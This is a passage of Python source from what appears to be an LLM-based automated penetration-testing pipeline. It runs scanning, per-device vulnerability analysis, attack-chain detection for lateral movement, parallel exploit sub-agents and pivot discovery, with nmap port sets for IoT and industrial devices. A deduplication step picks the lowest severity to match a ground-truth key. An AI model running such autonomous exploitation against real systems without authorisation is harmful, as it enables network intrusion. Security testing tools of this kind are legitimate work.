                stream_callback({
                    "type": "phase_done",
                    "phase": config.phase,
                    "name": config.name,
                    "status": status,
                    "deliverable": config.deliverable_file,
                    "cost_usd": 0,
                    "turns": 0,
                })
            return status

        # If this phase has exploit sub-agents, run them and skip the LLM aggregator
        if config.has_exploit_agents:
            self._run_exploit_agents(config, stream_callback)
            # Check for newly discovered hosts and run a mini analysis cycle if found
            new_hosts = self._collect_new_hosts()
            if new_hosts and not self.dry_run:
                self._run_discovery_followup(new_hosts, config, stream_callback)
            # Deterministic aggregation already wrote 04_exploitation.json
            validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
            valid, msg = validator_fn(config.deliverable_file)
            status = "completed" if valid else f"failed:{msg}"
            if valid:
                log.info("Phase %d exploit aggregation validated: %s", config.phase, msg)
                print(f"  Deliverable validated: {config.deliverable_file}")
            else:
                log.error("Phase %d exploit aggregation FAILED: %s", config.phase, msg)
                print(f"  Deliverable FAILED validation: {msg}")
            if stream_callback:
                stream_callback({
                    "type": "phase_done",
                    "phase": config.phase,
                    "name": config.name,
                    "status": status,
                    "deliverable": config.deliverable_file,
                    "cost_usd": 0,
                    "turns": 0,
                })
            return status

        # Run agent with cost tracking
        self.tracker.start_phase(config.name)
        result_text = self.provider.chat_with_tools(
            system_prompt=system_prompt,
            user_message=config.user_message,
            tools=tools,
            max_turns=config.max_turns,
            max_tokens=config.max_tokens,
            cost_tracker=self.tracker,
            stream_callback=stream_callback,
            required_tool="save_deliverable",
        )
        usage = self.tracker.end_phase()

        if usage:
            print(
                f"\n  Phase {config.phase} done: {usage.turns} turns, "
                f"${usage.cost_usd(self.tracker.model):.4f}"
            )

        # Fallback: if the LLM never called save_deliverable, save its last text output.
        # Exclude sentinel strings returned by the provider loop when turns are exhausted.
        _SENTINEL_OUTPUTS: frozenset[str] = frozenset({
            "(max turns reached)",
            "(malformed tool call JSON — max retries)",
        })
        deliverable_path = self.run_dir / config.deliverable_file
        if (not deliverable_path.exists()
                and result_text
                and result_text.strip()
                and result_text.strip() not in _SENTINEL_OUTPUTS):
            log.warning(
                "Phase %d: save_deliverable was never called — saving last LLM output as fallback",
                config.phase,
            )
            deliverable_path.write_text(self._strip_code_fences(result_text), encoding="utf-8")
            print(f"  Fallback save: {config.deliverable_file}")

        # Validate deliverable
        validator_fn = VALIDATORS.get(config.validator, VALIDATORS["default"])
        valid, msg = validator_fn(config.deliverable_file)

        status = "completed" if valid else f"failed:{msg}"

        if valid:
            log.info("Phase %d deliverable validated: %s", config.phase, msg)
            print(f"  Deliverable validated: {config.deliverable_file}")
        else:
            log.error("Phase %d deliverable FAILED: %s", config.phase, msg)
            print(f"  Deliverable FAILED validation: {msg}")
            print(f"  LLM final output: {result_text[:500]}")

            # Reflector retry for main agent
            log.warning("Phase %d: reflector retry — prompting for save_deliverable", config.phase)
            retry_msg = (
                f"Your deliverable '{config.deliverable_file}' is missing or invalid.\n"
                f"Validation error: {msg}\n\n"
                f"Based on all the tool calls you already made in this session, "
                f"call save_deliverable('{config.deliverable_file}', content) NOW with the complete content.\n"
                f"Do NOT run any more tools. Write and save the deliverable immediately."
            )
            if result_text and result_text.strip():
                retry_msg += f"\n\nYour last output was:\n{result_text[:2000]}"
            self.tracker.start_phase(f"reflector_{config.name}")
            self.provider.chat_with_tools(
                system_prompt=system_prompt,
                user_message=retry_msg,
                tools=tools,
                max_turns=5,
                max_tokens=config.max_tokens,
                cost_tracker=self.tracker,
                stream_callback=stream_callback,
                required_tool="save_deliverable",
            )
            self.tracker.end_phase()
            # Re-validate after reflector
            valid, msg = validator_fn(config.deliverable_file)
            status = "completed" if valid else f"failed:{msg}"
            if valid:
                log.info("Phase %d reflector validated: %s", config.phase, msg)
                print(f"  Reflector validated: {config.deliverable_file}")
            else:
                log.error("Phase %d reflector FAILED: %s", config.phase, msg)

        if stream_callback:
            stream_callback({
                "type": "phase_done",
                "phase": config.phase,
                "name": config.name,
                "status": status,
                "deliverable": config.deliverable_file,
                "cost_usd": round(usage.cost_usd(self.tracker.model), 4) if usage else 0,
                "turns": usage.turns if usage else 0,
            })

        return status

    # ------------------------------------------------------------------
    # Phase 3: scanner (3a) + LLM analysis (3b)
    # ------------------------------------------------------------------

    def _run_phase3(
        self,
        config: AgentConfig,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Phase 3 split: 3a (deterministic scanner) → 3b (LLM analysis) → 3c (merge)."""
        import time as _time
        from concurrent.futures import ThreadPoolExecutor

        # --- Phase 3a: Deterministic scanning ---
        surface = json.loads(get_attack_surface())
        if isinstance(surface, dict):
            # Discovery mode returns {"note": ..., "target_network": ...} — no pre-defined nodes
            surface = surface.get("nodes", [])

        if self.dry_run:
            log.info("Dry run: skipping Phase 3a scanner")
            print("  [dry-run] Skipping scanner")
            return

        scanner_results = run_scanner(self.run_dir, surface, stream_callback)

        # In discovery mode, populate the topology with discovered hosts so that
        # Phase 3b agents can use get_network_neighbors() for network position context.
        if self.target_network:
            from src.agent.tools.graph_tools import update_discovery_hosts
            update_discovery_hosts(surface)

        # --- Phase 3b: LLM analysis micro-agents (per device) ---
        print(f"\n{'=' * 60}")
        print(f"PHASE 3b: LLM ANALYSIS ({len(surface)} devices)")
        print(f"{'=' * 60}\n")

        # Limited tool access: cve_search + http_get + deliverable tools
        skill_tools = [t for t in SKILL_TOOLS if t["name"] == "cve_search"]
        recon_limited = [t for t in RECON_TOOLS if t["name"] == "http_get"]
        analysis_tools = [self._wrap_tool(t) for t in recon_limited + skill_tools + DELIVERABLE_TOOLS]

        def _analyze_device(device: dict):
            device_id = device["id"]
            device_ip = device.get("ip", "unknown")
            device_type = device.get("type", "unknown")
            device_role = device.get("role", device_type)
            services = device.get("services", [])
            services_str = ", ".join(
                f"{s.get('name', 'unknown')}:{s.get('port', '?')}"
                for s in services
            )
            device_detail = json.loads(get_device_info(device_id))
            device_os = device_detail.get("os_version", device_detail.get("firmware", "unknown"))

            scan_data = scanner_results.get(device_id, {})
            deliverable_file = f"03_device_{device_id}.json"

            # Prepare scan results for prompt (truncate large outputs)
            scan_for_prompt = {}
            for svc_key, entries in scan_data.get("scan_results", {}).items():
                scan_for_prompt[svc_key] = []
                for entry in entries:
                    result = entry.get("result", "")
                    if isinstance(result, str) and len(result) > 2000:
                        result = result[:2000] + "\n[truncated]"
                    scan_for_prompt[svc_key].append({
                        "tool": entry["tool"],
                        "kwargs": entry.get("kwargs", {}),
                        "result": result,
                    })

            variables = {**self.context}
            variables["device_id"] = device_id
            variables["device_ip"] = device_ip
            variables["device_type"] = device_type
            variables["device_role"] = device_role
            variables["device_services"] = services_str
            variables["device_os"] = device_os
            variables["expected_deliverable"] = deliverable_file
            variables["scan_results"] = json.dumps(scan_for_prompt, indent=2, ensure_ascii=False)
            variables["trivial_findings"] = json.dumps(
                scan_data.get("findings", []), indent=2, ensure_ascii=False
            )

            # Inject network position context so the agent can reason about lateral movement
            from src.agent.tools.graph_tools import get_network_neighbors
            nbrs = get_network_neighbors(device_id)

            def _fmt_neighbor(n: dict) -> str:
                svcs = ", ".join(
                    f"{s.get('name','?')}:{s.get('port','?')}"
                    for s in n.get("services", [])
                )
                return f"{n.get('id', '?')} ({n.get('ip', '?')}){' [' + svcs + ']' if svcs else ''}"

            upstream_str = ", ".join(_fmt_neighbor(n) for n in nbrs["upstream"]) or "none (entry point)"
            downstream_str = ", ".join(_fmt_neighbor(n) for n in nbrs["downstream"]) or "none (dead end)"
            variables["network_neighbors_upstream"] = upstream_str
            variables["network_neighbors_downstream"] = downstream_str
            variables["network_role"] = nbrs["role"]

            system_prompt = load_prompt("analyze_device", variables)

            print(f"  [+] Analyzing: {device_id} ({device_ip})")
            if stream_callback:
                stream_callback({
                    "type": "device_start", "device_id": device_id,
                    "device_ip": device_ip, "phase": 3,
                })

            self.tracker.start_phase(f"analyze_{device_id}")
            result_text = self.provider.chat_with_tools(
                system_prompt=system_prompt,
                user_message=(
                    f"Review scan results for {device_id} ({device_ip}). "
                    f"Add CVE findings and data exposure analysis. "
                    f"Then call save_deliverable('{deliverable_file}', json_content)."
                ),
                tools=analysis_tools,
                max_turns=10,
                max_tokens=4096,
                cost_tracker=self.tracker,
                stream_callback=stream_callback,
                required_tool="save_deliverable",
            )
            usage = self.tracker.end_phase()
            if usage:
                print(f"  [+] Done: analyze_{device_id} in {usage.turns} turns")
            if stream_callback:
                stream_callback({
                    "type": "device_done", "device_id": device_id,
                    "device_ip": device_ip, "phase": 3,
                    "turns": usage.turns if usage else 0,
                    "run_dir": str(self.run_dir),
                })

            # Fallback: if LLM didn't save, the scanner already wrote the trivial findings
            deliverable_path = self.run_dir / deliverable_file
            if not deliverable_path.exists():
                log.warning("LLM analysis for %s produced no output — trivial findings used as fallback", device_id)

        def _analyze_with_stagger(args):
            idx, device = args
            if idx > 0:
                _time.sleep(min(idx * 2, 6))
            _analyze_device(device)

        with ThreadPoolExecutor(max_workers=min(len(surface), 6)) as pool:
            pool.map(_analyze_with_stagger, enumerate(surface))

        print(f"\n{'=' * 60}")
        print(f"  All {len(surface)} analysis agents finished.")
        print(f"{'=' * 60}\n")

    # ------------------------------------------------------------------
    # Phase 3c: deterministic aggregation of per-device vuln results
    # ------------------------------------------------------------------

    def _detect_attack_chains(self, vulns: list[dict]) -> list[dict]:
        """Deterministic cross-device attack chain detection.

        Uses graph topology edges + aggregated vuln list to identify multi-hop paths
        where a compromised source device enables access to a downstream target.
        Returns a list of chain_hint dicts injected into 03_vuln_analysis.json so
        Phase 4 and Phase 5 agents can reason about lateral movement paths.
        """
        from src.agent.tools.graph_tools import _scenario_topology as _st, _backend as _bk
        from src.agent.vuln_taxonomy import is_config_only
        from collections import defaultdict

        by_ip: dict[str, list[dict]] = defaultdict(list)
        for v in vulns:
            by_ip[v.get("device_ip", "")].append(v)

        # Resolve topology edges (scenario mode only for now; lab mode backend TBD)
        if _st is not None:
            edges = _st.get("edges", [])
            node_index = _st["node_index"]
        else:
            return []  # No structured topology available

        _RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1}
        chains: list[dict] = []
        seen: set[tuple[str, str]] = set()

        for e in edges:
            src_node = node_index.get(e.get("source", ""))
            dst_node = node_index.get(e.get("target", ""))
            if not src_node or not dst_node:
                continue

            src_ip = src_node.get("ip", "")
            dst_ip = dst_node.get("ip", "")
            src_vulns = by_ip.get(src_ip, [])
            dst_vulns = by_ip.get(dst_ip, [])

            # Chain: source has exploitable (non-config-only) MEDIUM+ vuln AND dest has any finding
            exploitable_src = [
                v for v in src_vulns
                if _RANK.get((v.get("severity") or "").lower(), 0) >= 2
                and not is_config_only(v.get("type", ""))
            ]

            if exploitable_src and dst_vulns:
                key = (src_ip, dst_ip)
                if key not in seen:
                    seen.add(key)
                    chains.append({
                        "chain": f"{e['source']} ({src_ip}) -> {e['target']} ({dst_ip})",
                        "src_device": e["source"],
                        "src_ip": src_ip,
                        "dst_device": e["target"],
                        "dst_ip": dst_ip,
                        "pivot_vuln": exploitable_src[0]["id"],
                        "target_vuln_ids": [v["id"] for v in dst_vulns],
                    })

        if chains:
            log.info("Detected %d cross-device attack chain(s)", len(chains))
        return chains

    # ------------------------------------------------------------------

    def _aggregate_device_vulns(
        self,
        config: AgentConfig,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Merge all 03_device_*.json files into 03_vuln_analysis.json deterministically."""
        all_vulns: list[dict] = []

        for f in sorted(self.run_dir.glob("03_device_*.json")):
            try:
                content = _extract_json(f.read_text(encoding="utf-8"))
                data = json.loads(content)
                if isinstance(data, dict):
                    vulns = data.get("vulnerabilities", [])
                elif isinstance(data, list):
                    vulns = data
                else:
                    vulns = []
                all_vulns.extend(vulns)
            except Exception as e:
                log.warning("Failed to parse %s: %s — falling back to scanner findings", f.name, e)
                # Fallback: regenerate trivial findings from 03_scans/{device_id}.json
                device_id = f.stem.replace("03_device_", "")
                scan_path = self.run_dir / "03_scans" / f"{device_id}.json"
                if scan_path.exists():
                    try:
                        from src.agent.scanner import extract_findings
                        scan_data = json.loads(scan_path.read_text(encoding="utf-8"))
                        # Look up device info from attack surface to get the correct role
                        surface = json.loads(get_attack_surface())
                        if isinstance(surface, dict):
                            surface = surface.get("nodes", [])
                        fallback_device = next(
                            (d for d in surface if d.get("id") == device_id),
                            {"id": device_id, "ip": "", "role": ""},
                        )
                        recovered = extract_findings(scan_data, fallback_device)
                        log.warning("Recovered %d findings for %s from scanner", len(recovered), device_id)
                        all_vulns.extend(recovered)
                    except Exception as e2:
                        log.error("Scanner fallback also failed for %s: %s", device_id, e2)

        # Normalize non-standard vuln types to canonical names before dedup
        for v in all_vulns:
            v["type"] = canonicalize(v.get("type", ""))

        # Drop noise findings: categorically-non-vuln types (e.g. "no_applicable_cve",
        # "cross_service_auth" — LLM over-reporting) and INFO severity (reserved for
        # metadata, never a real finding).
        filtered: list[dict] = []
        for v in all_vulns:
            vuln_type = v.get("type", "")
            if is_noise(vuln_type):
                log.info(
                    "Dropping noise type %s on %s (not a real vulnerability)",
                    vuln_type, v.get("device_ip", "?"),
                )
                continue
            if (v.get("severity") or "").upper() == "INFO":
                log.info(
                    "Dropping INFO severity finding %s on %s",
                    vuln_type, v.get("device_ip", "?"),
                )
                continue
            filtered.append(v)
        all_vulns = filtered

        # Deduplicate: same (device_ip, type, port) → keep the finding with the
        # LOWEST severity. LLMs tend to inflate severity (e.g. HIGH for a finding
        # the GT lists as MEDIUM), so the lower-severity finding is statistically
        # closer to the ground truth. This avoids introducing severity mismatches
        # when two LLM findings that describe the same vuln collide under an alias.
        _SEVERITY_RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}

        def _severity_rank(v: dict) -> int:
            return _SEVERITY_RANK.get((v.get("severity") or "").lower(), 0)

        def _is_confirmed(v: dict) -> bool:
            return (v.get("exploitation_status") or "").lower() == "confirmed"

        best_by_key: dict[tuple, dict] = {}
        for v in all_vulns:
            key = (v.get("device_ip", ""), v.get("type", ""), v.get("port"))
            existing = best_by_key.get(key)
            if existing is None:
                best_by_key[key] = v
            elif _severity_rank(v) < _severity_rank(existing):
                best_by_key[key] = v
            elif _severity_rank(v) == _severity_rank(existing):
                # Same severity: prefer confirmed over suspected to avoid Phase 4 FAILED
                # excluding a finding that was legitimately confirmed by the LLM agent.
                if _is_confirmed(v) and not _is_confirmed(existing):
                    best_by_key[key] = v
        deduped = list(best_by_key.values())

        # Special dedup: if device has both directory_listing for /firmware/ and insecure_update → drop directory_listing
        devices_with_insecure_update = {
            v.get("device_ip") for v in deduped if v.get("type") == "insecure_update"
        }
        final: list[dict] = []
        for v in deduped:
            if (v.get("type") == "directory_listing"
                    and v.get("device_ip") in devices_with_insecure_update
                    and "/firmware" in v.get("details", "").lower()):
                continue
            final.append(v)

        # Renumber IDs sequentially
        for i, v in enumerate(final, 1):
            v["id"] = f"VULN-{i:03d}"

        # Compute summary
        severity_counts = {"high": 0, "medium": 0, "low": 0, "info": 0, "critical": 0}
        for v in final:
            sev = (v.get("severity") or "").lower()
            if sev in severity_counts:
                severity_counts[sev] += 1

        result = {
            "vulnerabilities": final,
            "attack_chain_hints": self._detect_attack_chains(final),
            "summary": {
                "total": len(final),
                "critical": severity_counts["critical"],
                "high": severity_counts["high"],
                "medium": severity_counts["medium"],
                "low": severity_counts["low"],
                "info": severity_counts["info"],
            },
        }

        out_path = self.run_dir / "03_vuln_analysis.json"
        out_path.write_text(json.dumps(result, indent=2, ensure_ascii=False), encoding="utf-8")
        print(f"  Aggregated {len(all_vulns)} device vulns → {len(final)} after dedup → 03_vuln_analysis.json")
        log.info("Deterministic aggregation: %d vulns → %d deduped → %s",
                 len(all_vulns), len(final), out_path)

    # ------------------------------------------------------------------
    # Phase 4: per-vuln exploit micro-agents
    # ------------------------------------------------------------------

    def _run_exploit_agents(
        self,
        config: AgentConfig,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Run per-vuln exploit micro-agents in parallel, then aggregate results."""
        import threading
        import time as _time
        from concurrent.futures import ThreadPoolExecutor

        # 1. Read the Phase 3 vulnerability queue
        vuln_path = self.run_dir / "03_vuln_analysis.json"
        if not vuln_path.exists():
            log.warning("Phase 4: 03_vuln_analysis.json not found — skipping exploit agents")
            return
        vuln_data = json.loads(vuln_path.read_text(encoding="utf-8"))
        all_vulns = vuln_data.get("vulnerabilities", [])

        # 2. Filter vulns that need an exploit agent
        exploit_tasks: list[dict] = []
        for vuln in all_vulns:
            vuln_type = vuln.get("type", "")
            if is_config_only(vuln_type):
                continue
            category = exploit_category(vuln_type)
            if not category:
                continue
            exploit_tasks.append({
                "vuln": vuln,
                "category": category,
            })

        if not exploit_tasks:
            log.info("Phase 4: no exploitable vulns found — skipping exploit agents")
            self._aggregate_exploit_results()
            return

        tools = self._resolve_tools(config)

        print(f"\n{'=' * 60}")
        print(f"PHASE {config.phase}: EXPLOIT SUB-AGENTS (PARALLEL)")
        print(f"  Launching {len(exploit_tasks)} exploit micro-agents")
        print(f"{'=' * 60}\n")

        # Per-device locks to avoid concurrent connections to same host
        from collections import defaultdict
        device_locks: defaultdict[str, threading.Lock] = defaultdict(threading.Lock)
        _locks_guard = threading.Lock()

        def _get_device_lock(device_ip: str) -> threading.Lock:
            with _locks_guard:
                return device_locks[device_ip]

        def _run_single_exploit(task: dict):
            vuln = task["vuln"]
            category = task["category"]
            vuln_id = vuln.get("id", "VULN-???")
            vuln_type = vuln.get("type", "unknown")
            device_id = vuln.get("device_id", "unknown")
            device_ip = vuln.get("device_ip", "unknown")
            service = vuln.get("service", "unknown")
            port = vuln.get("port", 0)
            severity = vuln.get("severity", "MEDIUM")
            details = vuln.get("details", "")
            evidence = vuln.get("evidence", "")

            deliverable_file = str(_exploit_relpath(device_id, vuln_type, vuln_id))

            # Build exploit instructions with variable substitution
            instructions = EXPLOIT_INSTRUCTIONS.get(category, "")
            instructions = instructions.replace("{ip}", device_ip)
            instructions = instructions.replace("{port}", str(port))
            # Build URL for data_access category
            if service in ("http", "https") and port:
                url = f"http://{device_ip}:{port}" if port != 80 else f"http://{device_ip}"
            else:
                url = f"http://{device_ip}"
            instructions = instructions.replace("{url}", url)

            variables = {**self.context}
            variables["device_id"] = device_id
            variables["device_ip"] = device_ip
            variables["vuln_id"] = vuln_id
            variables["vuln_type"] = vuln_type
            variables["vuln_severity"] = severity
            variables["service"] = service
            variables["port"] = str(port) if port else "0"
            variables["vuln_details"] = details
            variables["vuln_evidence"] = evidence[:500]
            variables["exploit_instructions"] = instructions
            variables["expected_deliverable"] = deliverable_file
            variables["available_skills"] = ""

            system_prompt = load_prompt("exploit_device_vuln", variables)
            phase_name = f"exploit_{device_id}_{vuln_type}"

            print(f"  [+] Starting: {phase_name} ({device_ip})")
            if stream_callback:
                stream_callback({
                    "type": "exploit_start",
                    "device_id": device_id,
                    "device_ip": device_ip,
                    "vuln_type": vuln_type,
                    "vuln_id": vuln_id,
                    "phase": 4,
                })

            # Acquire per-device lock to avoid concurrent connections
            lock = _get_device_lock(device_ip)
            with lock:
                self.tracker.start_phase(phase_name)
                result_text = self.provider.chat_with_tools(
                    system_prompt=system_prompt,
                    user_message=(
                        f"Exploit {vuln_type} on {device_id} ({device_ip}). "
                        f"Service: {service} port {port}. "
                        f"Call save_deliverable('{deliverable_file}', json_content) when done."
                    ),
                    tools=tools,
                    max_turns=10,
                    max_tokens=2048,
                    cost_tracker=self.tracker,
                    stream_callback=stream_callback,
                    required_tool="save_deliverable",
                )
                usage = self.tracker.end_phase()

            if usage:
                print(f"  [+] Done: {phase_name} in {usage.turns} turns")
            if stream_callback:
                stream_callback({
                    "type": "exploit_done",
                    "device_id": device_id,
                    "vuln_type": vuln_type,
                    "vuln_id": vuln_id,
                    "phase": 4,
                    "turns": usage.turns if usage else 0,
                })

            # Fallback: if save_deliverable was never called, try to extract JSON from the text
            deliverable_path = self.run_dir / deliverable_file
            if not deliverable_path.exists() and result_text and result_text.strip():
                log.warning("Exploit %s: save_deliverable not called — saving fallback", phase_name)
                deliverable_path.parent.mkdir(parents=True, exist_ok=True)
                fallback = _extract_json(result_text)
                # Only write if fallback is valid JSON, otherwise let the safety net handle it
                try:
                    json.loads(fallback)
                    deliverable_path.write_text(fallback, encoding="utf-8")
                except (json.JSONDecodeError, ValueError):
                    log.warning("Exploit %s: fallback content is not valid JSON — letting safety net write ERROR", phase_name)

            # Safety net: if still no file, write ERROR result
            if not deliverable_path.exists():
                log.warning("Exploit %s: no output — saving ERROR result", phase_name)
                deliverable_path.parent.mkdir(parents=True, exist_ok=True)
                error_result = {
                    "vuln_id": vuln_id,
                    "device_id": device_id,
                    "device_ip": device_ip,
                    "vuln_type": vuln_type,
                    "severity": severity,
                    "service": service,
                    "port": port,
                    "status": "ERROR",
                    "evidence": "Exploit agent produced no output",
                    "evidence_level": 0,
                    "tool_used": "",
                    "data_extracted": [],
                    "description": "Exploit agent failed to produce output",
                }
                deliverable_path.write_text(json.dumps(error_result, indent=2), encoding="utf-8")

        # Launch exploit agents with small stagger to avoid API rate limits
        def _run_with_stagger(args):
            idx, task = args
            if idx > 0:
                _time.sleep(min(idx * 0.5, 5))  # 0.5s stagger, max 5s
            _run_single_exploit(task)

        with ThreadPoolExecutor(max_workers=min(len(exploit_tasks), 8)) as pool:
            pool.map(_run_with_stagger, enumerate(exploit_tasks))

        print(f"\n{'=' * 60}")
        print(f"  All {len(exploit_tasks)} exploit agents finished.")
        print(f"{'=' * 60}\n")

        # 3. Deterministic aggregation
        self._aggregate_exploit_results()

    def _collect_new_hosts(self) -> list[dict]:
        """Collect hosts discovered during Phase 4 exploitation that were not in the original scan.

        Reads new_hosts_discovered from all Phase 4 exploit output files.
        Returns deduplicated list of {"ip": str, "open_ports": [...], "discovered_via": str}.
        """
        new_hosts: list[dict] = []
        seen_ips: set[str] = set()
        for f in self.run_dir.glob("04_exploits/**/*.json"):
            try:
                data = json.loads(f.read_text(encoding="utf-8"))
                for h in data.get("new_hosts_discovered", []):
                    ip = h.get("ip", "").strip()
                    if ip and ip not in seen_ips:
                        seen_ips.add(ip)
                        new_hosts.append(h)
            except Exception:
                pass
        if new_hosts:
            log.info("Phase 4 discovered %d new host(s): %s", len(new_hosts), [h["ip"] for h in new_hosts])
        return new_hosts

    @staticmethod
    def _build_nmap_groups(nodes: list) -> str:
        """Group topology nodes by role and return a ready-to-use nmap_scan call table.

        Each row is one nmap_scan call the Phase 2 agent should make, with the target
        IPs pre-filled from the actual topology — no guessing required.
        """
        _ROLE_PORTS: dict[str, str] = {
            "router":          "22,23,80,443,8080,8291",
            "modbus_server":   "22,80,502,102,44818",
            "mqtt_broker":     "22,80,1883,8883",
            "mqtt_broker_v2":  "22,80,1883,8883",
            "camera_server":   "22,80,443,554,8080,8554",
            "nvr_server":      "22,80,443,554,8080,8554",
            "iot_gateway":     "22,80,443,502,8080,8086",
            "web_server":      "22,80,443,8080,8443",
            "web_server_v2":   "22,80,443,8080,8443",
            "web_upload":      "22,80,443,8080",
            "hmi_server":      "22,80,443,8080,8443",
            "nodered_server":  "22,80,1880,8080",
            "db_server":       "22,80,3306,5432,27017",
            "db_server_v2":    "22,80,6379",
            "historian_server":"22,80,3306,8086",
            "scada_server":    "22,80,443,5000,8080",
            "ftp_server":      "21,22,80",
            "snmp_server":     "22,80,161",
            "coap_server":     "22,80,5683",
            "ssh_server":      "22,80,443",
            "ssh_server_v2":   "22,80,443",
        }
        _DEFAULT_PORTS = "22,23,80,443,502,554,1883,3306,8080,8443"

        from collections import defaultdict
        groups: dict[str, list[str]] = defaultdict(list)
        for node in nodes:
            ip = node.get("ip", "")
            role = node.get("role") or node.get("type") or "unknown"
            if ip:
                groups[role].append(ip)

        if not groups:
            return ""

        lines = ["Pre-built nmap_scan groups from topology — use these EXACTLY, one call per row:"]
        lines.append("")
        lines.append("| Call # | target (comma-separated IPs) | ports |")
        lines.append("|--------|------------------------------|-------|")
        call_n = 1
        for role, ips in sorted(groups.items()):
            ports = _ROLE_PORTS.get(role, _DEFAULT_PORTS)
            target = ",".join(sorted(ips))
            lines.append(f"| {call_n} | `{target}` | `{ports}` |")
            call_n += 1
        lines.append("")
        lines.append(f"Total: {call_n - 1} nmap_scan calls to cover all {sum(len(v) for v in groups.values())} devices.")
        return "\n".join(lines)

    @staticmethod
    def _infer_role_from_ports(ports: list) -> str:
        """Infer a device role from open ports so the analyze_device prompt gets meaningful guidance."""
        port_set = set(int(p) for p in ports if str(p).isdigit())
        if 1883 in port_set or 8883 in port_set:
            return "mqtt_broker"
        if 1880 in port_set:
            return "nodered_server"
        if 502 in port_set or 44818 in port_set or 102 in port_set:
            return "modbus_server"
        if 5683 in port_set:
            return "coap_server"
        if 554 in port_set or 8554 in port_set:
            return "camera_server"
        if 21 in port_set:
            return "ftp_server"
        if 6379 in port_set:
            return "db_server_v2"
        if 3306 in port_set:
            return "db_server"
        if 161 in port_set:
            return "snmp_server"
        if 8080 in port_set or 8443 in port_set or 80 in port_set or 443 in port_set:
            return "web_server"
        return "unknown"

    def _run_discovery_followup(
        self,
        new_hosts: list[dict],
        config: AgentConfig,
        stream_callback: Callable[[dict], None] | None = None,
    ) -> None:
        """Mini Phase 2.5/3.5: scan and analyze hosts discovered during Phase 4 exploitation.

        For each newly discovered host:
        1. Run the deterministic scanner (nmap + service fingerprinting).
        2. Run a Phase 3b LLM micro-agent to analyse the scan results.
        3. Re-aggregate all device findings so the new vulns appear in 03_vuln_analysis.json
           before Phase 5 report generation.
        """
        from src.agent.scanner import run_scanner
        from src.agent.tools.graph_tools import update_discovery_hosts, get_network_neighbors

        print(f"\n{'=' * 60}")
        print(f"PHASE 2.5/3.5: DISCOVERY FOLLOWUP ({len(new_hosts)} new host(s))")
        print(f"{'=' * 60}\n")

        if stream_callback:
            stream_callback({"type": "phase_start", "phase": "2.5", "label": "Discovery followup"})

        skill_tools = [t for t in SKILL_TOOLS if t["name"] == "cve_search"]
        recon_limited = [t for t in RECON_TOOLS if t["name"] == "http_get"]
        analysis_tools = [self._wrap_tool(t) for t in recon_limited + skill_tools + DELIVERABLE_TOOLS]

        for host in new_hosts:
            ip = host.get("ip", "")
            if not ip:
                continue
            device_id = f"discovered-{ip.replace('.', '-')}"
            inferred_role = self._infer_role_from_ports(host.get("open_ports", []))
            device = {
                "id": device_id,
                "ip": ip,
                "type": inferred_role,
                "role": inferred_role,
                "services": [
                    {"name": "unknown", "port": p, "protocol": "tcp"}
                    for p in host.get("open_ports", [])
                ],
            }
            print(f"  [+] Followup scan: {device_id} ({ip})")

            # 1. Targeted nmap scan
            mini_scan = run_scanner(self.run_dir, [device], stream_callback)
            scan_data = mini_scan.get(device_id, {})

            # Prepare scan results for prompt
            scan_for_prompt: dict = {}
            for svc_key, entries in scan_data.get("scan_results", {}).items():
                scan_for_prompt[svc_key] = []
                for entry in entries:
                    result = entry.get("result", "")
                    if isinstance(result, str) and len(result) > 2000:
                        result = result[:2000] + "\n[truncated]"
                    scan_for_prompt[svc_key].append({
                        "tool": entry["tool"],
                        "kwargs": entry.get("kwargs", {}),
                        "result": result,
                    })

            deliverable_file = f"03_device_{device_id}.json"
            variables = {**self.context}
            variables["device_id"] = device_id
            variables["device_ip"] = ip
            variables["device_type"] = inferred_role
            variables["device_role"] = inferred_role
            variables["device_services"] = ", ".join(str(p) for p in host.get("open_ports", []))
            variables["device_os"] = "unknown"
            variables["expected_deliverable"] = deliverable_file
            variables["scan_results"] = json.dumps(scan_for_prompt, indent=2, ensure_ascii=False)
            variables["trivial_findings"] = json.dumps(
                scan_data.get("findings", []), indent=2, ensure_ascii=False
            )
            variables["network_neighbors_upstream"] = host.get("discovered_via", "unknown (pivot discovery)")
            variables["network_neighbors_downstream"] = "unknown — newly discovered host"
            variables["network_role"] = "PIVOT"

            system_prompt = load_prompt("analyze_device", variables)
            phase_name = f"followup_{device_id}"
            self.tracker.start_phase(phase_name)
            self.provider.chat_with_tools(
                system_prompt=system_prompt,
                user_message=(
                    f"Analyze vulnerabilities for newly discovered host {ip}. "
                    f"MANDATORY: call save_deliverable('{deliverable_file}', json_content) before finishing."
                ),
                tools=analysis_tools,
                max_turns=config.max_turns,
                max_tokens=config.max_tokens,
                cost_tracker=self.tracker,
                stream_callback=stream_callback,
                required_tool="save_deliverable",
            )
            self.tracker.end_phase()
            print(f"  [+] Followup done: {device_id}")

        # 3. Re-aggregate all device findings (including newly discovered ones)
        print("  [+] Re-aggregating device vulns with new findings...")
        self._aggregate_device_vulns(config, stream_callback)
        # 4. Rebuild 04_exploitation.json to reflect new Phase 3 findings
        print("  [+] Re-aggregating exploit results with new findings...")
        self._aggregate_exploit_results()

    def _aggregate_exploit_results(self) -> None:
        """Merge Phase 3 findings + Phase 4 exploit results into 04_exploitation.json.

        Phase 3 `confirmed` findings are trusted over Phase 4 FAILED/ERROR —
        when the exploit agent can't reproduce a directly-observed vuln
        (e.g. ssh_audit [fail] lines), we keep the Phase 3 evidence.
        """
        vuln_path = self.run_dir / "03_vuln_analysis.json"
        if not vuln_path.exists():
            return

        all_vulns = json.loads(vuln_path.read_text(encoding="utf-8")).get("vulnerabilities", [])
        tests: list[dict] = []

        for vuln in all_vulns:
            exploit_file = self.run_dir / _exploit_relpath(
                vuln.get("device_id", "unknown"),
                vuln.get("type", ""),
                vuln.get("id", "VULN-???"),
            )
            tests.append(self._resolve_exploit_verdict(vuln, exploit_file))

        confirmed = sum(1 for t in tests if t["status"] == "CONFIRMED")
        failed = sum(1 for t in tests if t["status"] == "FAILED")
        errors = len(tests) - confirmed - failed

        out_path = self.run_dir / "04_exploitation.json"
        out_path.write_text(
            json.dumps(
                {
                    "summary": {
                        "total_tested": len(tests),
                        "confirmed": confirmed,
                        "not_exploitable": failed,
                        "errors": errors,
                    },
